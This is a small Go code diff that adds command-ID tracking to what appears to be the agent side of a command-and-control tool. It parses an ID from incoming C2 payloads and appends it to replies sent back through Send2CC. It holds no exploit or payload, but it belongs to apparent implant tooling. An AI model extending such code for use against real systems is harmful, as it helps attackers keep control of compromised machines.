@@ -31,6 +31,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 	payloadSplit := strings.Split(data.Payload, emp3r0r_data.OpSep)
 	op := payloadSplit[0]
+	cmd_id := payloadSplit[len(payloadSplit)-1]
 
 	switch op {
 
@@ -506,6 +507,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 	}
 
 send:
+	data2send.Payload += emp3r0r_data.OpSep + cmd_id // cmd_id for cmd tracking
 	if err = Send2CC(&data2send); err != nil {
 		log.Println(err)
 	}
